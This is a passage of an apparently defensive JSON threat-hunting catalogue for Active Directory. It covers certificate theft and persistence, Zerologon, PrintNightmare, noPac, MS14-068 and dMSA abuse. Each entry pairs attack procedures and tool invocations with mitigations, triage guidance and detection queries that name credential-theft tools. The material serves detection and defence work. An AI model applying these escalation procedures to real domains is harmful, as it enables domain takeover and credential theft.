CommandLine=\"*\\\\ProgramData\\\\Microsoft\\\\Crypto\\\\Keys*\")\n| stats count values(CommandLine) as cmd by ComputerName, UserName, FileName\n| sort - count"}]},{"name":"THEFT4 - Finding Certificate Files on Disk","aka":"PFX/PEM file hunting","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1552.004, T1083","cve":"","sev":"Medium","summary":"Search for and collect certificate files (.pfx/.p12/.pem/.key/.crt) stored in plaintext or with weak passwords on the filesystem to obtain private keys.","how":"Prereq: read access to the target host/shares. Sweep disks, file shares, backups, and scripts for .pfx/.p12/.pem/.key, etc., crack found PFX passwords (empty/dictionary/hash cracking with pfx2john), and use them for certificate authentication. SYSVOL, automation scripts, and developer PCs are prime targets.","tools":"Seatbelt, Snaffler, findstr/Get-ChildItem, pfx2john+john/hashcat, Certipy","detect":"Monitor bulk access to certificate files on file shares (5145), execution of hunting tools like Snaffler, and anomalous access to sensitive extensions.","events":"5145, 5140, 4663, EDR","mitigate":"Do not place private-key files in plaintext or on shares; protect with strong passphrases/secret management (Vault). Inventory SYSVOL and shares with DLP/auditing. Remove certificates from dev/ops scripts and keep them short-lived.","triage":"On file servers/shares, pull 5145 (RelativeTargetName *.pfx/*.p12/*.pem/*.key), 5140, and 4663 for bulk/broad access to sensitive extensions across SYSVOL, script shares, and developer PCs, and use EDR/Sysmon EID1 to catch Snaffler/Seatbelt/findstr/Get-ChildItem recursive hunting. A single account sweeping many shares and fixating on cert files looks like scanning (lean malicious); chaining to pfx2john/authentication (4768) confirms it. It is benign when a known backup/asset-inventory/DLP/vuln-scanner host performs scheduled broad scans with no hunting-tool execution or follow-on authentication.","hunt":[{"plat":"Sentinel","t":"Bulk share access (5145) to cert files (.pfx/.pem/.p12) = malicious sweep / single legit read = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5145\n| where RelativeTargetName has_any (\".pfx\", \".pem\", \".p12\", \".pvk\", \".key\", \".crt\")\n| summarize Hits=count(), Files=dcount(RelativeTargetName), Shares=make_set(ShareName,5) by SubjectUserName, IpAddress, Computer, bin(TimeGenerated, 10m)\n| where Files > 5 or Hits > 20\n| sort by Hits desc"},{"plat":"MDE","t":"Execution of credential-hunting tools (Snaffler) or broad cert-extension search = malicious","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where ProcessCommandLine has_any (\"Snaffler\", \"-o snaffler\", \"*.pfx\", \"*.pem\", \"-Include *.pfx\", \"findstr\") and ProcessCommandLine has_any (\".pfx\",\".pem\",\".p12\",\"Snaffler\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName\n| summarize n=count(), Cmds=make_set(ProcessCommandLine,6) by DeviceName, AccountName"}],"huntcs":[{"plat":"LogScale","t":"Snaffler / recursive *.pfx/*.pem hunting commands = black; single cert open = white","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(Snaffler|Invoke-Snaffler|(-Recurse|\\/s|\\/r).{0,40}\\.(pfx|pem|p12|key)|(dir|gci|findstr|where).{0,40}\\.(pfx|pem|p12))/i\n| groupBy([ComputerName, UserName, FileName], function=count(as=hits))\n| sort(hits, order=desc)"}]},{"name":"THEFT5 - NTLM Credential Theft via PKINIT (UnPAC-the-hash)","aka":"UnPAC-the-hash","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1550.003, T1558","cve":"","sev":"High","summary":"Use the PAC_CREDENTIAL_INFO (NTLM credentials) contained in a TGT obtained via PKINIT to recover the user's NTLM hash from a certificate. Even after the certificate is revoked/expired, the hash allows persistent authentication.","how":"Prereq: possession of the target user's authentication certificate (PKINIT-capable). Use Rubeus asktgt /getcredentials /certificate:user.pfx or certipy auth -pfx user.pfx to PKINIT and obtain a TGT, decrypt the PAC_CREDENTIAL_INFO in the response to extract the NTLM hash, then authenticate via PtH thereafter. Converting certificate to hash increases persistence.","tools":"Rubeus (asktgt /getcredentials), Certipy auth, gettgtpkinit.py+getnthash.py (PKINITtools)","detect":"Monitor correlation, under the same account, of certificate-based PKINIT authentication (4768 with the Certificate Information field) followed by NTLM authentication (4776/4624 type3). Detect unexpected combined PKINIT+NTLM use.","events":"4768(PKINIT), 4776, 4624","mitigate":"Minimize and shorten the lifetime of authentication certificates. On compromise, reset the password twice (to invalidate the NTLM hash). Implement KB5014754 strong mapping and PKINIT monitoring, and continuously revoke and inventory certificates.","triage":"On the DC, correlate 4768 (PKINIT with a populated Certificate Information field) followed shortly by 4776 (NTLM credential validation) or 4624 LogonType3 (NTLM) for the same account, and confirm Rubeus asktgt /getcredentials or certipy auth on the source host via Sysmon EID1. It is malicious when an account that entered via certificate immediately pivots to NTLM-hash PtH (cert-to-hash conversion). It is benign when smart-card logon legitimately triggers NTLM fallback to a known app/legacy resource after PKINIT with no getcredentials-style tooling.","hunt":[{"plat":"Sentinel","t":"Same account doing certificate PKINIT (4768) then NTLM (4776) shortly after = UnPAC-the-hash (malicious); either alone = benign","q":"let pkinit = SecurityEvent\n    | where TimeGenerated > ago(1d) | where EventID == 4768 and (Properties has \"Certificate\")\n    | project PkTime=TimeGenerated, Account=TargetUserName, IpAddress;\nlet ntlm = SecurityEvent\n    | where TimeGenerated > ago(1d) | where EventID == 4776\n    | project NtTime=TimeGenerated, Account=TargetUserName, Computer;\npkinit\n| join kind=inner ntlm on Account\n| where NtTime between (PkTime .. (PkTime + 10m))\n| project Account, PkTime, NtTime, IpAddress, Computer\n| summarize n=count() by Account, IpAddress"}],"huntcs":[{"plat":"Event Search","t":"Rubeus/certipy cert-TGT to NTLM hash (getcredentials/UnPAC) = black; normal PKINIT logon = white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*asktgt*\" AND CommandLine=\"*/getcredentials*\") OR CommandLine=\"*/getcredentials*\" OR (CommandLine=\"*certipy*\" AND CommandLine=\"*auth*\") OR CommandLine=\"*unpac*\"\n| stats count values(CommandLine) as cmd by ComputerName, UserName, FileName, ParentBaseFileName\n| sort - count"}]},{"name":"PERSIST1 - User Persistence via Certificate Enrollment","aka":"long-term user persistence via certificate","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649, T1550.003","cve":"","sev":"High","summary":"A persistence technique in which a legitimately long-validity client authentication certificate is enrolled with compromised user privileges, allowing continued certificate authentication even after a password change.","how":"Prereq: target user's Enroll rights. During compromise, enroll and store an authentication certificate for the user with certipy req / Certify request; even if the password is reset, continue obtaining TGTs and access via certipy auth for the certificate's validity period. Combine with UnPAC-the-hash (THEFT5) to ease re-entry.","tools":"Certipy, Certify, Rubeus","detect":"Monitor unexpected certificate enrollment by users (4886/4887), especially certificate authentication (4768) by the same account after incident response. Inventory issued certificates.","events":"4886, 4887, 4768","mitigate":"Revoke the compromised account's certificates as well and combine with a password reset. Shorten authentication-certificate validity and audit enrollment. Keep CRL/OCSP functional to ensure revocation.","triage":"On the CA, pull 4886/4887 for unexpected issuance of user-auth templates (Requester, timestamp, validity period) and correlate on the DC whether the same account keeps authenticating via 4768 (PKINIT) after incident response/password reset. It is malicious when a long-lived cert issued during compromise still yields TGTs/access post-containment independent of the password. It is benign when issuance is a normal renewal cycle (autoenrollment GPO, smart-card renewal) from the user's own host unrelated to the incident; inventory issued certs to catch un-revoked ones.","hunt":[{"plat":"Sentinel","t":"Unexpected user certificate issuance (4887) followed by that account's cert logon (4768) = persistence (malicious); routine autoenroll = benign","q":"let issued = SecurityEvent\n    | where TimeGenerated > ago(1d) | where EventID in (4886,4887)\n    | extend Requester = tostring(coalesce(TargetUserName, SubjectUserName))\n    | project IssueTime=TimeGenerated, Requester, Computer;\nissued\n| where Requester !endswith \"$\"\n| join kind=leftouter (\n    SecurityEvent | where TimeGenerated > ago(1d) | where EventID == 4768 and Properties has \"Certificate\"\n    | project PkTime=TimeGenerated, Requester=TargetUserName\n  ) on Requester\n| summarize Issued=count(), PkinitAfter=countif(PkTime > IssueTime) by Requester, Computer\n| where Issued > 0"}],"huntcs":[{"plat":"Event Search","t":"Unexpected cert enrollment (certipy req / Certify / certreq) by an interactive user = black; IT baseline = white","q":"event_simpleName=ProcessRollup2 ((CommandLine=\"*certipy*\" AND CommandLine=\"*req*\") OR (CommandLine=\"*Certify*\" AND CommandLine=\"*request*\") OR (CommandLine=\"*certreq*\" AND CommandLine=\"*-enroll*\"))\n| stats count values(CommandLine) as cmd values(FileName) as file by ComputerName, UserName\n| sort - count"}]},{"name":"PERSIST2 - Machine Persistence via Certificate","aka":"machine persistence via certificate","phase":"privesc","group":"ADCS (Certificate Services)","mitre":"T1649, T1550.003","cve":"","sev":"High","summary":"Persistence in which a certificate for a compromised computer account (especially a DC) is enrolled and retained, allowing continued machine authentication even after machine-password rotation.","how":"Prereq: target machine account (or SYSTEM) privileges. Enroll and store the target machine's certificate via the Machine/DomainController template, then obtain the machine account's TGT via certipy auth thereafter. A DC$ certificate leads to DCSync; authentication remains possible for the certificate's validity even after the machine password auto-rotates.","tools":"Certipy, Certify, Rubeus","detect":"Monitor certificate enrollment by machine accounts (4887) and subsequent PKINIT (4768). Flag as anomalous machine-certificate acquisition, especially via non-DC$ paths.","events":"4886, 4887, 4768","mitigate":"Revoke the compromised machine's certificate and rebuild the machine account. Shorten machine-certificate template validity, audit enrollment, and rigorously operate revocation (CRL).","triage":"On the CA, pull 4886/4887 for machine-cert issuance from Machine/DomainController templates (requesting machine, validity) and correlate machine-account 4768 (PKINIT) on the DC. It is malicious when a machine cert is obtained via an unusual path (manual req outside autoenrollment, unexpected host) or authentication continues on the cert after machine-password rotation; for DC$ certs, check for follow-on DCSync-style 4662. It is benign when issuance is normal autoenrollment/device-cert distribution (NDES/Intune, GPO autoenrollment) with the requester being the machine itself at a scheduled renewal.","hunt":[{"plat":"Sentinel","t":"Machine-account cert issuance (4887) then PKINIT (4768); a non-DC machine acquiring it = malicious / DC autoenroll = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4886,4887)\n| extend Requester = tostring(coalesce(TargetUserName, SubjectUserName))\n| where Requester endswith \"$\"\n| where Requester !startswith \"DC\" and Requester !has \"DC0\"\n| project TimeGenerated, Computer, Requester, Properties\n| join kind=leftouter (\n    SecurityEvent | where TimeGenerated > ago(1d) | where EventID == 4768 and Properties has \"Certificate\"\n    | project PkTime=TimeGenerated, Requester=TargetUserName\n  ) on Requester\n| summarize Issued=count(), UsedPkinit=countif(isnotempty(PkTime)) by Requester, Computer"}],"huntcs":[{"plat":"Event Search","t":"Machine/DC/KerberosAuth-template cert request off the normal DC$ path = black; auto-enroll baseline = white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*req*\" OR CommandLine=\"*request*\") (CommandLine=\"*-template Machine*\" OR CommandLine=\"*template DomainController*\" OR CommandLine=\"*KerberosAuthentication*\" OR (CommandLine=\"*certipy*\" AND CommandLine=\"*machine*\"))\n| stats count values(CommandLine) as cmd by ComputerName, UserName, FileName\n| sort - count"}]},{"name":"Zerologon","aka":"Netlogon EoP","phase":"privesc","group":"Critical CVEs","mitre":"T1068, T1210","cve":"CVE-2020-1472","sev":"Critical","summary":"Exploits a flaw in the Netlogon (MS-NRPC) crypto implementation to set the DC machine account password to empty, leading to full domain compromise.","how":"Abuses a flaw where MS-NRPC's AES-CFB8 accepts an all-zero IV. Sends an all-zero ClientCredential repeatedly to ComputeNetlogonCredential, succeeding on average after 256 attempts. Uses NetrServerPasswordSet2 to reset the DC$ password to empty, then runs DCSync via secretsdump in that state to steal KRBTGT and Domain Admin hashes. Requires only network reachability (445/TCP RPC) and no credentials. Note: after exploitation, the original password must be written back to AD/LSA or the DC becomes unable to authenticate.","tools":"CVE-2020-1472 PoC(SecuraBV zerologon_tester/exploit)、impacket secretsdump.py、mimikatz(lsadump::zerologon)、nccgroup dirkjanm系スクリプト","detect":"Monitor for a spike in authentication failures against a single machine account in a short window and consecutive NetrServerPasswordSet2 calls. Password change events (4742) for DC$ itself, or anonymous/empty-password Netlogon authentication against the DC, are anomaly signals. Correlate abnormal Netlogon RPC frequency in SIEM.","events":"4742(コンピュータアカウント変更), 4672, 5805, Netlogon 5827/5829/5830/5831, 4624(Logon Type 3)","mitigate":"Apply the August 2020 patch (mandatory) and enable the February 2021 Enforcement mode. Set the FullSecureChannelProtection registry value to 1 to reject vulnerable connections. Monitor DC events 5827/5829 to surface non-compliant devices.","triage":"On the DC security log confirm 4742 changing DC$'s own password, and correlate whether it is immediately preceded by a burst of Netlogon RPC (445/TCP) access from one host plus Netlogon Operational 5827/5829 (denied) within a short window. On the source host Sysmon EID1/3 showing zerologon_tester/secretsdump.py execution and a 445 connection to the DC, followed on the DC by 4672 and DCSync-style 4662 (Replicating Directory Changes GUID 1131f6aa/1131f6ad) under the same non-DC account, chains to black. A lone 4742 from legitimate machine-account password rotation (30-day cycle, initiated by the DC itself with no other RPC anomaly), or a known vuln-scanner/monitoring server with no auth-failure spike, leans white.","hunt":[{"plat":"Sentinel","t":"DC's own machine-account password reset (4742) firing anonymously/repeatedly = Zerologon (malicious); single monthly rotation = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4742\n| where TargetUserName endswith \"$\"\n| where SubjectUserName in~ (\"ANONYMOUS LOGON\",\"-\",\"\") or isempty(SubjectUserName) or SubjectUserName endswith \"$\"\n| summarize Resets=count(), Actors=make_set(SubjectUserName,5) by TargetUserName, Computer, bin(TimeGenerated, 5m)\n| where Resets > 1\n| sort by Resets desc"},{"plat":"Sentinel","t":"Surge of anonymous/null Type-3 logons (4624) to a DC = Netlogon brute attempt (malicious); legit service auth = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4624 and LogonType == 3\n| where TargetUserName in~ (\"ANONYMOUS LOGON\") or AccountType == \"Computer\"\n| where isnotempty(IpAddress) and IpAddress != \"-\"\n| summarize Logons=count() by IpAddress, Computer, bin(TimeGenerated, 5m)\n| where Logons > 20\n| sort by Logons desc"}],"huntcs":[{"plat":"Event Search","t":"Zerologon exploit run (empty-pw set then impacket secretsdump) on the attacker host = black; normal Netlogon = white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*zerologon*\" OR CommandLine=\"*cve-2020-1472*\" OR CommandLine=\"*set_empty_pw*\" OR CommandLine=\"*reinstall_original_pw*\" OR CommandLine=\"*NetrServerPasswordSet*\" OR (CommandLine=\"*secretsdump*\" AND CommandLine=\"*-just-dc*\"))\n| stats count values(CommandLine) as cmd by ComputerName, UserName, FileName\n| sort - count"},{"plat":"LogScale","t":"One host bursting 135/445 to a DC then dumping it = black; steady admin tooling = white","q":"#event_simpleName=NetworkConnectIP4\n| RemotePort=445 OR RemotePort=135\n| groupBy([aid, ComputerName, RemoteAddressIP4, ContextBaseFileName], function=count(as=conns))\n| conns>200\n| sort(conns, order=desc)\n// pair with Falcon Identity Protection detection: Zerologon (Netlogon 5827/5829 anomaly is DC-only)"}]},{"name":"PrintNightmare (RCE)","aka":"Print Spooler RCE","phase":"privesc","group":"Critical CVEs","mitre":"T1068, T1210, T1547","cve":"CVE-2021-34527, CVE-2021-1675","sev":"Critical","summary":"Loads a malicious driver DLL as SYSTEM via Print Spooler's RpcAddPrinterDriverEx to achieve RCE / privilege escalation.","how":"Calls RpcAddPrinterDriverEx via MS-RPRN/MS-PAR to make the spooler load a malicious driver DLL from a UNC path (SMB share) and execute it as SYSTEM. An authenticated low-privilege domain user targeting the spooler on a DC gains domain privilege escalation. 1675 is the local privilege escalation aspect; 34527 is the remote code execution aspect. Loose Point and Print settings allow non-admins to succeed.","tools":"cube0x0 CVE-2021-1675.py、SharpPrintNightmare、Invoke-Nightmare、mimikatz(misc::printnightmare)、impacket","detect":"Monitor for spoolsv.exe spawning child processes or loading DLLs from non-standard paths via EDR/Sysmon (EventID 7 Image Load). External driver additions and UNC path references are logged in the PrintService Operational log. The spooler running on a DC at all is itself noteworthy.","events":"Microsoft-Windows-PrintService/Operational 316/808, Admin 808, 4697(サービスインストール), Sysmon 1/7/11, 4104","mitigate":"Apply the latest patch. Stop/disable the Print Spooler service on hosts that don't need it (e.g., DCs). Harden Point and Print via registry: set RestrictDriverInstallationToAdministrators to 1 and NoWarningNoElevationOnInstall to 0.","triage":"On the target (especially a DC) check Sysmon EID7 Image Load for spoolsv.exe loading a DLL from a non-standard/UNC path and EID1 for spoolsv.exe spawning cmd/powershell, correlating with PrintService/Operational 808 (driver add/load) and 316. Source host running SharpPrintNightmare/Invoke-Nightmare (Sysmon EID1, 4104) then target 4624 LogonType3 then a SYSTEM spoolsv.exe child process, chained under one account at one time, is black. Legitimate driver distribution (a signed driver from a print server/SCCM added from a local path during business hours, with no child process or UNC payload) leans white.","hunt":[{"plat":"MDE","t":"spoolsv.exe spawning a child process (cmd/powershell/rundll32) = PrintNightmare RCE (malicious); normal spooler = benign","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where InitiatingProcessFileName =~ \"spoolsv.exe\"\n| where FileName has_any (\"cmd.exe\",\"powershell.exe\",\"rundll32.exe\",\"wscript.exe\",\"cscript.exe\",\"regsvr32.exe\")\n| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessCommandLine, AccountName\n| summarize n=count(), Children=make_set(FileName,6) by DeviceName, AccountName"},{"plat":"MDE","t":"spoolsv.exe loading a DLL from a non-standard/writable path = malicious driver injection (malicious); genuine drivers under system32\\spool = benign","q":"DeviceImageLoadEvents\n| where Timestamp > ago(1d)\n| where InitiatingProcessFileName =~ \"spoolsv.exe\"\n| where FolderPath has_any (@\"\\Windows\\Temp\", @\"\\Users\\\", @\"\\ProgramData\\\", @\"\\spool\\drivers\\x64\\3\\\") \n| where not(FolderPath has @\"\\System32\\spool\\drivers\\x64\\3\\PrintConfig\")\n| project Timestamp, DeviceName, FileName, FolderPath, SHA256\n| summarize n=count(), Dlls=make_set(FileName,8) by DeviceName, FolderPath"}],"huntcs":[{"plat":"Event Search","t":"spoolsv.exe spawning cmd/powershell/rundll32 children = black; legitimate spooler children = white","q":"event_simpleName=ProcessRollup2 ParentBaseFileName=spoolsv.exe FileName IN (\"cmd.exe\",\"powershell.exe\",\"rundll32.exe\",\"regsvr32.exe\",\"wscript.exe\",\"cscript.exe\",\"mshta.exe\")\n| stats count values(CommandLine) as cmd by ComputerName, FileName, GrandParentBaseFileName\n| sort - count"},{"plat":"LogScale","t":"Spooler-driven child from spoolsv on a DC = black; add rare-child fan-out","q":"#event_simpleName=ProcessRollup2\n| ParentBaseFileName=/spoolsv\\.exe/i\n| FileName=/(cmd|powershell|rundll32|regsvr32|mshta)\\.exe/i\n| groupBy([ComputerName, FileName], function=count(as=hits))\n| sort(hits, order=desc)"}]},{"name":"noPac / sAMAccountName Spoofing","aka":"sam-the-admin, CVE-2021-42278+42287","phase":"privesc","group":"Critical CVEs","mitre":"T1558, T1078.002","cve":"CVE-2021-42278, CVE-2021-42287","sev":"Critical","summary":"Exploits weak machine account name validation to obtain a TGS impersonating a DC and escalate to Domain Admin-equivalent.","how":"Uses MachineAccountQuota to create a machine account, then renames its sAMAccountName to a DC name (with the trailing $ removed). Obtains a TGT with that account, then reverts the account name. During TGT validation the DC cannot find the account and falls back to DC$, allowing an S4U2self service ticket impersonating Domain Admin. Requires a low-privilege domain user and MAQ>0.","tools":"noPac.py(Ridter/Cube0x0)、sam_the_admin.py、impacket(getST/secretsdump)、Rubeus","detect":"Detect the sequence of machine account creation → rename → rename-back in a short window. Monitor for sAMAccountName changes matching an existing DC name and for missing trailing $. Mismatches between TGT/TGS requests under the same name are also indicators.","events":"4741(コンピュータ作成), 4781(アカウント名変更), 4768/4769(Kerberos), 4662","mitigate":"Apply the November 2021 patch to all DCs. Set ms-DS-MachineAccountQuota to 0 to prevent ordinary users from creating machine accounts. Monitor 4741/4781 to detect renames closely resembling DC names.","triage":"On the DC security log check whether one principal produces, in a short window, 4741 (computer created via MAQ) then 4781 (sAMAccountName renamed, missing trailing $ and matching a DC name) then another 4781 (renamed back). If a 4768 TGT request under the renamed name is followed, after the name is gone, by an S4U2self 4769 falling back to DC$ for a privileged service and 4662 records the object edits, it is black. Legitimate device kitting/join tooling emitting 4741, or a naming-convention-compliant rename (keeps trailing $, no DC-name collision) with no round-trip rename or TGT mismatch, is white.","hunt":[{"plat":"Sentinel","t":"Machine account created (4741) then sAMAccountName renamed (4781) fast; rename to a DC name / dropped trailing $ = noPac (malicious)","q":"let created = SecurityEvent\n    | where TimeGenerated > ago(1d) | where EventID == 4741\n    | project CreateTime=TimeGenerated, Actor=SubjectUserName, NewComputer=TargetUserName, Computer;\nlet renamed = SecurityEvent\n    | where TimeGenerated > ago(1d) | where EventID == 4781\n    | project RenameTime=TimeGenerated, Actor=SubjectUserName, OldName=tostring(extract(@\"Old Account Name[^A-Za-z0-9]+([\\w\\.\\-\\$]+)\",1,Properties)), NewName=TargetUserName;\ncreated\n| join kind=inner renamed on Actor\n| where RenameTime between (CreateTime .. (CreateTime + 15m))\n| where NewName !endswith \"$\" or NewName has \"DC\"\n| project Actor, NewComputer, OldName, NewName, CreateTime, RenameTime, Computer"},{"plat":"Sentinel","t":"TGT (4768) vs TGS (4769) mismatch for a machine account (rename-induced PAC confusion) = noPac exploitation (malicious)","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4768, 4769)\n| where TargetUserName endswith \"$\" or ServiceName endswith \"$\"\n| where TicketEncryptionType == \"0x17\"\n| summarize Tgt=countif(EventID==4768), Tgs=countif(EventID==4769), Names=make_set(TargetUserName,8) by IpAddress, bin(TimeGenerated, 10m)\n| where Tgt > 0 and Tgs > 0 and array_length(Names) > 1\n| sort by Tgs desc"}],"huntcs":[{"plat":"Event Search","t":"noPac / sam-the-admin tooling (create→rename→S4U) on the attacker host = black; legit computer join = white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*noPac*\" OR CommandLine=\"*sam_the_admin*\" OR CommandLine=\"*sam-the-admin*\" OR (CommandLine=\"*addcomputer*\" AND CommandLine=\"*impacket*\") OR (CommandLine=\"*renameMachine*\") OR (CommandLine=\"*getST*\" AND CommandLine=\"*-impersonate*\"))\n| stats count values(CommandLine) as cmd by ComputerName, UserName, FileName\n| sort - count"},{"plat":"Identity Protection","t":"4741 create → 4781 rename to a DC name (missing trailing $) → TGS mismatch is DC-only — Falcon Identity Protection","q":"// Falcon Identity Protection detection: noPac / sAMAccountName spoofing (CVE-2021-42278/42287). The 4741/4781 rename-to-DC-name and Kerberos S4U ticket mismatch are DC-side only; correlate the impacket/noPac process above with this IP alert."}]},{"name":"MS14-068 Kerberos PAC Forgery","aka":"Kerberos Checksum Vulnerability","phase":"privesc","group":"Critical CVEs","mitre":"T1558, T1068","cve":"CVE-2014-6324","sev":"Critical","summary":"Exploits a PAC signature validation flaw in the TGT to escalate to domain admin using a forged PAC asserting arbitrary groups (Domain Admins).","how":"Exploits a flaw where the KDC accepts unkeyed/weak checksums such as MD5 for the PAC signature. With a low-privilege user's plaintext password or hash, generate a TGT carrying a forged PAC containing privileged SIDs (e.g., Domain Admins) to gain privileged access to any service. Requires only a single domain user's credentials.","tools":"pykek(ms14-068.py)、impacket goldenPac.py、mimikatz(kerberos::ptt)","detect":"Monitor for high-privilege access by accounts that should never have it, TGTs issued in a short window, and TGS requests from non-standard tools. Enable PAC validation and enforce integrity checks at the KDC. Lingering legacy-OS DCs are the greatest risk.","events":"4768, 4769, 4624, 4672","mitigate":"Apply MS14-068 (November 2014) to all DCs. Even a single unpatched DC compromises the whole domain, so full patch verification is essential. Also disable RC4 and enforce PAC validation.","triage":"On the DC check the 4769/4624 immediately after 4768 (TGT issued) for an account with no normal privilege performing Domain Admins-level access, and whether the gap from TGT issuance to privileged use is abnormally short. Source host Sysmon EID1 showing ms14-068.py/goldenPac.py/mimikatz kerberos::ptt, then a short-lived TGT, then 4769 to a target service, then a 4672-bearing privileged logon under the same low-priv account, chains to black (and it only works against unpatched legacy DCs). A legitimate admin accessing from a PAW with the correct privileged account (privilege and account consistent, no non-standard tool) is white.","hunt":[{"plat":"Sentinel","t":"Non-machine account gets special privileges (4672) within minutes of a TGT (4768) = forged-PAC privesc black / known admin routine elevation = white","q":"let tgts = SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4768\n| project tgtTime=TimeGenerated, Account=TargetUserName, IpAddress, DC=Computer;\nSecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4672\n| where PrivilegeList has_any (\"SeTcbPrivilege\",\"SeEnableDelegationPrivilege\",\"SeDebugPrivilege\",\"SeBackupPrivilege\")\n| where SubjectUserName !endswith \"$\"\n| project privTime=TimeGenerated, Account=SubjectUserName, DC=Computer\n| join kind=inner tgts on Account\n| where privTime between (tgtTime .. (tgtTime + 5m))\n| summarize hits=count(), DCs=make_set(DC) by Account, IpAddress\n| where hits > 0"},{"plat":"MDE","t":"Execution artifacts of MS14-068 exploit tooling (PyKEK/goldenPac) = black / none = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where ProcessCommandLine has_any (\"ms14-068\",\"pykek\",\"goldenPac\",\"kekeo\") or FileName has_any (\"ms14-068.exe\",\"goldenPac.py\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName"}],"huntcs":[{"plat":"Event Search","t":"Surfaces PAC-forgery tooling (PyKEK/goldenPac/kekeo) executing on a host; run on a workstation=bad.","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*ms14-068*\" OR CommandLine=\"*ms14068*\" OR CommandLine=\"*goldenPac*\" OR FileName=\"goldenPac.exe\" OR FileName=\"kekeo.exe\" OR FileName=\"ms14-068.exe\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine"},{"plat":"Identity Protection","t":"DC-side PAC/etype anomaly is not EDR telemetry; defer to Identity Protection detection.","q":"// Falcon Identity Protection detection: MS14-068 PAC forgery / abnormal privileged access from a normally low-priv account (旧OS残存DC最大リスク)"}]},{"name":"BadSuccessor (dMSA Abuse)","aka":"delegated Managed Service Account abuse","phase":"privesc","group":"Critical CVEs","mitre":"T1078, T1098, T1558","cve":"","sev":"Critical","summary":"Abuses the dMSA migration feature in Windows Server 2025 to obtain a PAC inheriting the privileges of an arbitrary privileged account, leading to domain compromise.","how":"A low-privilege user with object-creation rights over an OU (etc.) creates a new dMSA, sets msDS-ManagedAccountPrecededByLink to the target (e.g., Domain Admin) and msDS-DelegatedMSAState to 2. By faking a completed migration, the dMSA receives a PAC inheriting the target's full privileges, and can further compute the dMSA's password offline via the KDS root key to impersonate persistently. Requires only creation rights over an OU/container; no write access to existing accounts is needed.","tools":"SharpSuccessor、BadSuccessor PoC(Akamai/Yuval Gordon)、Rubeus、Certipy(補助)","detect":"Closely monitor creation of new dMSA objects and changes to the msDS-ManagedAccountPrecededByLink/msDS-DelegatedMSAState attributes. A link set to a privileged account such as Domain Admin is the decisive signal. Also monitor TGT/TGS requests by dMSAs.","events":"5137(オブジェクト作成), 5136(属性変更), 4662, 4769, 2946","mitigate":"Inventory and minimize Create Child rights (especially msDS-DelegatedManagedServiceAccount) on OUs/containers. Restrict dMSA creation to administrators only. Set alerts for changes to the relevant attributes, and tighten delegation ACLs when deploying Server 2025.","triage":"In the DC directory-service audit check whether 5137 (dMSA object created) is followed by 5136 setting that object's msDS-ManagedAccountPrecededByLink to a privileged account (e.g. Domain Admin) and msDS-DelegatedMSAState to 2, corroborated by 4662. A low-priv principal with only OU create rights setting these, then a dMSA 4768 TGT request and a privilege-inherited PAC 4769 plus KDS-related 2946 at the same time, is black. A legitimate dMSA migration (an approved admin performing service-account succession where the linked target is the expected service account and matches a change ticket) is white.","hunt":[{"plat":"Sentinel","t":"Low-priv actor links a dMSA's msDS-ManagedAccountPrecededByLink/DelegatedMSAState to a privileged account (5136) = BadSuccessor black / admin-driven legit dMSA migration = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"msDS-ManagedAccountPrecededByLink\" or Properties has \"msDS-DelegatedMSAState\"\n| where OperationType == \"%%14674\"  // value added\n| where SubjectUserName !endswith \"$\"\n| project TimeGenerated, DC=Computer, Actor=SubjectUserName, dMSA=ObjectName, OperationType, Properties"},{"plat":"Sentinel","t":"Non-privileged account creates a new dMSA-class object (5137) = black / planned creation by IT ops = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5137\n| where ObjectType has \"msDS-DelegatedManagedServiceAccount\"\n| where SubjectUserName !endswith \"$\"\n| project TimeGenerated, DC=Computer, Actor=SubjectUserName, NewObject=ObjectName, ObjectType"}],"huntcs":[{"plat":"LogScale","t":"Catches dMSA creation / msDS-ManagedAccountPrecededByLink tampering tooling on the attacker host.","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(SharpSuccessor|BadSuccessor|msDS-ManagedAccountPrecededByLink|msDS-DelegatedMSAState|New-ADServiceAccount|Set-ADServiceAccount)/i\n| groupBy([ComputerName, UserName, FileName, CommandLine])"},{"plat":"Event Search","t":"Surfaces Rubeus /dmsa TGT/TGS requests abusing the delegated MSA link.","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*/dmsa*\" OR CommandLine=\"*asktgt*dmsa*\" OR (CommandLine=\"*Rubeus*\" AND CommandLine=\"*dmsa*\"))\n| stats count by ComputerName, UserName, FileName, CommandLine, ParentBaseFileName"}]},{"name":"AD DS Security Feature Bypass","aka":"Escalation via KeyCredentialLink/SD rewrite","phase":"privesc","group":"Critical CVEs","mitre":"T1556, T1098","cve":"CVE-2021-42291","sev":"High","summary":"A user with certain privileges can illicitly manipulate an object's security descriptor or credential attributes and abuse them for privileged authentication.","how":"An authenticated user with certain privileges abuses write access to a computer/user object's security descriptor or msDS-KeyCredentialLink to establish Shadow Credentials-style certificate-based privileged authentication. Used 